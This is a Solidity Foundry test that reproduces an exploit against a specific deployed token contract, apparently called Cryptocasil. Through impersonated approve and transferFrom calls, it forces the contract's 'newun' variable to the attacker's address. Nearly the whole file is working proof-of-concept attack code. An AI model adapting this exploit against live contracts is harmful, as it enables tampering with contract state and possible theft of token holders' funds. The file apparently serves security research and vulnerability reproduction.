// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ICryptocasil {
    function owner() external view returns (address);
    function newun() external view returns (address);
    function transfer(address to, uint tokens) external returns (bool);
    function approve(address spender, uint tokens) external returns (bool);
    function transferFrom(address from, address to, uint tokens) external returns (bool);
    function balanceOf(address tokenOwner) external view returns (uint);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x63769c0499f94D4E31fAc0F01D5d226bdd2C927D;
    address attacker = address(this);
    address private tokenHolder = address(0x123);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // We need to impersonate the owner to get initial tokens
        vm.startPrank(ICryptocasil(TARGET).owner());
        // Transfer some tokens to a helper address we control
        address tokenHolder = address(0x123);
        vm.deal(tokenHolder, 1 ether); // Give some ETH for gas
        // We'll need to call transfer on the token contract
        ICryptocasil(TARGET).transfer(tokenHolder, 1000 * 1e18);
        vm.stopPrank();

        // Label addresses for clarity
        vm.label(tokenHolder, "TokenHolder");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Verify initial state - newun should be address(0)
        address initialNewun = ICryptocasil(TARGET).newun();
        require(initialNewun == address(0), "newun should be uninitialized");

        // Step 2: Get approval from tokenHolder to spend tokens
        // We need to impersonate tokenHolder to call approve
        vm.prank(tokenHolder);
        ICryptocasil(TARGET).approve(attacker, 100 * 1e18);

        // Step 3: Call transferFrom to trigger the vulnerability
        // This will set newun to attacker address
        ICryptocasil(TARGET).transferFrom(tokenHolder, attacker, 1 * 1e18);

        // Step 4: Verify the state corruption
        address corruptedNewun = ICryptocasil(TARGET).newun();
        require(corruptedNewun == attacker, "newun should be set to attacker address");

        // Log the result for verification
        console.log("Initial newun:", initialNewun);
        console.log("Corrupted newun:", corruptedNewun);
        console.log("Attacker address:", attacker);
        assertEq(corruptedNewun, attacker, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

